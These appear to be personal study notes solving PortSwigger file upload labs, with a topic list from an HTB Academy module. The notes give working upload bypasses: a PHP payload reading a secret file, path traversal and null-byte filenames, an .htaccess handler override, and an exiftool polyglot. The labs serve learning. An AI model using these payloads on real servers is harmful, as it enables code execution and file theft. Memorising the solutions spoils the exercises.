It is during our darkest moments that we must focus to see the light. - Aristotle Onassis

# Week into File Upload Vuln Summary:

## Day - 1: Completed Port Swigger - File upload vulnerabilities

Lab 1: Exploiting unrestricted file uploads to deploy a web shell

- cd Desktop - touch try.php - nano try.php
```
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

(https://www.php.net/manual/en/function.file-get-contents.php)

- Navigate to `/files/avatars/try.php`
- Submit the secret - Solved. 

---

Lab 2: Exploiting flawed validation of file uploads

- Using the previous try.php
- Sending the request to repeater
- Changing the content-type to `image/jpeg`
- Navigate to `/files/avatars/try.php`
- Submit the secret - Solved. 


---

Lab 3: Preventing file execution in user-accessible directories

- Using the previous try.php
- Sending the request to repeater
- Changing the filename to `filename="..%2ftry.php"` - Path Traversal. (Indicates that the file was uploaded to a higher directory in the filesystem hierarchy (/files), and subsequently executed by the server.)
- Navigate to `/files/try.php`
- Submit the secret - Solved.

---

Lab 4: Insufficient blacklisting of dangerous file types

- Using the previous try.php
- Sending the request to repeater
- Notice that php ext is restricted.
- Now in this lab to bypass this blacklist - gotta upload below file. 
	- .htaccess with content `AddType application/x-httpd-php .lol` in it. 
	- with the request we had in the repeater with try.php
	- chaning the filename to `.htaccess` and also the content with `AddType application/x-httpd-php .lol`
	- and uploading the same. 
- Back to same request with `try.php` in repeater - changing the filename to `try.lol`
- Notice that the same has been uploaded.
- Navigate to `/files/avatars/try.lol`
- Submit the secret - Solved.

---

Lab 5: Obfuscating file extensions

- Using the previous try.php
- Sending the request to repeater
- Notice that it says only JPG & PNG files are allowed
- Now in order to bypass this:
	- Chaning the filename to `try.php%00.jpg` - adding nullbyte will strip off the rest and try.php will be uploaded.
- Navigate to `/files/avatars/try.php`
- Submit the secret - Solved.

---

Lab 6: Flawed validation of the file's contents

- This is very Interesting lab. In this lab it verifies that if it is a genuine image, hence comes polygot. (Polyglots, in a security context, are files that are a valid form of multiple different file types. - [Vickie li blog](https://vickieli.dev/hacking/polyglot/)) 
- Creating a polyglot PHP/JPG file using exiftool. (normal image, but contains your PHP payload in its metadata.)
	- `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o lmfao.php`
	- Here I downloaded a sample jpg from the internet and used in <YOUR-INPUT-IMAGE>
- Uploaded the lmfao.php
- Navigate to `/files/avatars/lmfao.php`
- Notice the secret is between Start and end in the first line itself
- Submit the secret - Solved.

---

Lab 7: Exploiting file upload race conditions

- Since new to race conditions, simply followed the solution given - also the note in the end of the solution is imp - adding `\r\n\r\n` sequence for GET request. 

---

## Day - 2: [Completed HTB Academy - File upload Attacks Module](https://academy.hackthebox.com/achievement/3444/136)

- I'm not sure if I can share my notes over here, since it's a paid lab [bought it with student subs], but below are the topics I learned - most of them are recap with more info on it. But I do highly suggest you people to go through this module once - pretty neat info. 

- Topics Learned/recaped:
	- Absent Validation
	- Upload Exploitation
		- Web Shell
		- Reverse Shell
	- Client-Side Validation
	- Blacklist Filters: _the web application checks if the extension exists anywhere within the file name._
	- Whitelist Filters: _the web application checks if the file name ends with the extension._
		- Double Extensions
		- Reverse Double Extensions
		- Character Injection
	- Type Filters
	- Decompression Bomb
	- Preventing File Upload Vulnerabilities
		- Extension Validation
		- Content Validation
		- Upload Disclosure
	- Lastly amazing Skills Assessment - Nailed it.

---

	






